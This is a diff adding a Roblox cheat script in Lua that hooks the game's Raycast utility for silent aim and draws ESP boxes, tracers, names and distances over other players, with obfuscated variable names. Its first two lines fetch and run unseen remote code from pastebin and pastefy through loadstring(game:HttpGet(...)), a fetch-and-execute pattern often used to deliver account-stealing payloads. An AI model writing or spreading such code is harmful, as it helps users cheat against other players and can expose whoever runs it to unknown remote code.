@@ -1,0 +1,304 @@
+loadstring(game:HttpGet("https://pastebin.com/raw/EWFUUrHi"))()
+loadstring(game:HttpGet('https://pastefy.app/6ElsMLeb/raw', true))()
+
+-- // NOTIFICATION ON EXECUTION // --
+pcall(function()
+    game:GetService("StarterGui"):SetCore("SendNotification", {
+        Title = "Script Executed!",
+        Text = "Thanks for using my script!",
+        Duration = 5,
+    })
+end)
+
+-- // SILENT AIM & PLAYER ESP CONFIGURATION // --
+getgenv().Config = {
+    -- Silent Aim Options
+    HitPart = "Head",
+    RandomHitPart = true,
+    
+    -- Target Switching Delay (Seconds to stick to a part before switching)
+    SwitchIntervalMin = 1.0,
+    SwitchIntervalMax = 1.5,
+
+    FOVRadius = 50,
+    ShowFOV = true,
+    
+    -- ESP Options (Players Only)
+    ESP = {
+        Enabled = true,
+        Boxes = true,
+        Tracers = true,
+        Names = true,
+        Distance = true,
+        
+        BoxColor = Color3.fromRGB(255, 0, 85),
+        TracerColor = Color3.fromRGB(255, 255, 255),
+        TextColor = Color3.fromRGB(255, 255, 255),
+        
+        TracerOrigin = "Bottom" -- "Bottom", "Middle"
+    }
+}
+
+local phem1_plrs = game:GetService("Players")
+local phem2_cs = game:GetService("CollectionService")
+local phem5 = game:GetService("ReplicatedStorage")
+local RunService = game:GetService("RunService")
+
+local phem6 = phem1_plrs.LocalPlayer
+local phem7 = require(phem5.Modules.Utility)
+local phem8 = phem7.Raycast
+local Camera = workspace.CurrentCamera
+
+-- // Timed Target Part State // --
+local TargetPartCache = {}
+
+-- Pure 50/50 Roll
+local function RollHitType()
+    return (math.random(1, 2) == 1) and "Head" or "Body"
+end
+
+-- Finds the actual physical basepart on the character based on the rolled target type
+local function FindTargetPart(entity, targetType)
+    if targetType == "Head" then
+        return entity:FindFirstChild("Head", true)
+    else
+        -- Search for any valid body part (handles R6, R15, and custom rigs)
+        return entity:FindFirstChild("HumanoidRootPart", true)
+            or entity:FindFirstChild("Torso", true)
+            or entity:FindFirstChild("UpperTorso", true)
+            or entity:FindFirstChild("LowerTorso", true)
+    end
+end
+
+-- Retrieves or updates the hit part for a target on a timer
+local function GetAssignedPart(entity)
+    local now = tick()
+    local cached = TargetPartCache[entity]
+
+    -- If no cache or timer expired, pick a new hit type & reset timer
+    if not cached or (now - cached.LastSwitch) >= cached.Interval then
+        local newType = getgenv().Config.RandomHitPart and RollHitType() or getgenv().Config.HitPart
+        local newInterval = math.random() * (getgenv().Config.SwitchIntervalMax - getgenv().Config.SwitchIntervalMin) + getgenv().Config.SwitchIntervalMin
+        
+        TargetPartCache[entity] = {
+            Type = newType,
+            LastSwitch = now,
+            Interval = newInterval
+        }
+    end
+
+    -- Return the physical part instance
+    local foundPart = FindTargetPart(entity, TargetPartCache[entity].Type)
+    
+    -- Fallback safety check if entity is partially loaded
+    if not foundPart then
+        foundPart = entity:FindFirstChild("Head", true) or entity:FindFirstChildWhichIsA("BasePart", true)
+    end
+
+    return foundPart
+end
+
+-- // FOV Circle Setup // --
+local phem4 = Drawing.new("Circle")
+phem4.Visible = getgenv().Config.ShowFOV
+phem4.Radius = getgenv().Config.FOVRadius
+phem4.Color = Color3.fromRGB(255, 255, 255)
+phem4.Thickness = 1
+phem4.Filled = false
+
+-- // ESP Storage Cache // --
+local ESPCache = {}
+
+local function CreateESP(player)
+    if ESPCache[player] then return end
+
+    local Box = Drawing.new("Square")
+    Box.Visible = false
+    Box.Thickness = 1.5
+    Box.Filled = false
+
+    local Name = Drawing.new("Text")
+    Name.Visible = false
+    Name.Size = 13
+    Name.Center = true
+    Name.Outline = true
+
+    local Distance = Drawing.new("Text")
+    Distance.Visible = false
+    Distance.Size = 12
+    Distance.Center = true
+    Distance.Outline = true
+
+    local Tracer = Drawing.new("Line")
+    Tracer.Visible = false
+    Tracer.Thickness = 1
+
+    ESPCache[player] = {
+        Box = Box,
+        Name = Name,
+        Distance = Distance,
+        Tracer = Tracer
+    }
+end
+
+local function RemoveESP(player)
+    if ESPCache[player] then
+        for _, obj in pairs(ESPCache[player]) do
+            obj:Remove()
+        end
+        ESPCache[player] = nil
+    end
+end
+
+-- // Target Selection Logic // --
+local function phem9()
+    local phem10 = Vector2.new(Camera.ViewportSize.X / 2, Camera.ViewportSize.Y / 2)
+    local phem11 = nil
+    local phem12 = getgenv().Config.FOVRadius
+    
+    for _, phem14 in phem2_cs:GetTagged("Entity") do
+        if phem14 == phem6.Character then 
+            continue 
+        end
+        
+        -- Get time-locked target part for this specific entity
+        local phem15 = GetAssignedPart(phem14)
+
+        if not phem15 or not phem15:IsA("BasePart") then 
+            continue 
+        end
+        
+        local phem16, phem17 = Camera:WorldToViewportPoint(phem15.Position)
+        if not phem17 then 
+            continue 
+        end
+        
+        local phem18 = (phem10 - Vector2.new(phem16.X, phem16.Y)).Magnitude
+        if phem18 < phem12 then
+            phem12 = phem18
+            phem11 = phem15
+        end
+    end
+
+    -- Cleanup cache for dead/despawned targets
+    for cachedEntity, _ in pairs(TargetPartCache) do
+        if not cachedEntity.Parent or not phem2_cs:HasTag(cachedEntity, "Entity") then
+            TargetPartCache[cachedEntity] = nil
+        end
+    end
+
+    return phem11
+end
+
+-- // Silent Aim Raycast Hook // --
+phem7.Raycast = function(self, phem19, phem20, phem21, phem22, phem23, phem24)
+    if type(phem21) ~= "number" or phem21 < 100 then
+        return phem8(self, phem19, phem20, phem21, phem22, phem23, phem24)
+    end
+    local phem25 = phem9()
+    if not phem25 then
+        return phem8(self, phem19, phem20, phem21, phem22, phem23, phem24)
+    end
+    local phem26 = phem25.Position
+    local phem27 = (phem26 - phem19).Unit
+    local phem28 = (phem26 - phem19).Magnitude
+    if phem28 > phem21 then
+        phem28 = phem21
+        phem26 = phem19 + (phem27 * phem21)
+    end
+    return {
+        Position = phem26,
+        Distance = phem28,
+        Instance = phem25,
+        Material = phem25.Material,
+        Normal = -phem27
+    }
+end
+
+-- // Main Render Loop // --
+RunService.RenderStepped:Connect(function()
+    phem4.Position = Camera.ViewportSize / 2
+    phem4.Radius = getgenv().Config.FOVRadius
+    phem4.Visible = getgenv().Config.ShowFOV
+
+    local activePlayers = {}
+
+    for _, plr in ipairs(phem1_plrs:GetPlayers()) do
+        if plr == phem6 then continue end
+        
+        local char = plr.Character
+        local hum = char and char:FindFirstChild("Humanoid")
+        local rootPart = char and (char:FindFirstChild("HumanoidRootPart") or char:FindFirstChild("Head"))
+        
+        if char and hum and hum.Health > 0 and rootPart then
+            activePlayers[plr] = true
+            CreateESP(plr)
+            
+            local esp = ESPCache[plr]
+            local pos, onScreen = Camera:WorldToViewportPoint(rootPart.Position)
+
+            if onScreen and getgenv().Config.ESP.Enabled then
+                local topPos = Camera:WorldToViewportPoint((rootPart.CFrame * CFrame.new(0, 3, 0)).Position)
+                local bottomPos = Camera:WorldToViewportPoint((rootPart.CFrame * CFrame.new(0, -3.5, 0)).Position)
+                
+                local boxHeight = math.abs(topPos.Y - bottomPos.Y)
+                local boxWidth = boxHeight * 0.65
+                local boxX = pos.X - (boxWidth / 2)
+                local boxY = topPos.Y
+
+                if getgenv().Config.ESP.Boxes then
+                    esp.Box.Size = Vector2.new(boxWidth, boxHeight)
+                    esp.Box.Position = Vector2.new(boxX, boxY)
+                    esp.Box.Color = getgenv().Config.ESP.BoxColor
+                    esp.Box.Visible = true
+                else
+                    esp.Box.Visible = false
+                end
+
+                if getgenv().Config.ESP.Names then
+                    esp.Name.Text = plr.Name
+                    esp.Name.Position = Vector2.new(pos.X, boxY - 16)
+                    esp.Name.Color = getgenv().Config.ESP.TextColor
+                    esp.Name.Visible = true
+                else
+                    esp.Name.Visible = false
+                end
+
+                if getgenv().Config.ESP.Distance then
+                    local distMeters = math.floor((rootPart.Position - Camera.CFrame.Position).Magnitude)
+                    esp.Distance.Text = string.format("[%dm]", distMeters)
+                    esp.Distance.Position = Vector2.new(pos.X, boxY + boxHeight + 2)
+                    esp.Distance.Color = getgenv().Config.ESP.TextColor
+                    esp.Distance.Visible = true
+                else
+                    esp.Distance.Visible = false
+                end
+
+                if getgenv().Config.ESP.Tracers then
+                    local tracerOrigin = Vector2.new(Camera.ViewportSize.X / 2, Camera.ViewportSize.Y)
+                    if getgenv().Config.ESP.TracerOrigin == "Middle" then
+                        tracerOrigin = Vector2.new(Camera.ViewportSize.X / 2, Camera.ViewportSize.Y / 2)
+                    end
+                    
+                    esp.Tracer.From = tracerOrigin
+                    esp.Tracer.To = Vector2.new(pos.X, pos.Y)
+                    esp.Tracer.Color = getgenv().Config.ESP.TracerColor
+                    esp.Tracer.Visible = true
+                else
+                    esp.Tracer.Visible = false
+                end
+            else
+                esp.Box.Visible = false
+                esp.Name.Visible = false
+                esp.Distance.Visible = false
+                esp.Tracer.Visible = false
+            end
+        end
+    end
+
+    for plr, _ in pairs(ESPCache) do
+        if not activePlayers[plr] then
+            RemoveESP(plr)
+        end
+    end
+end)
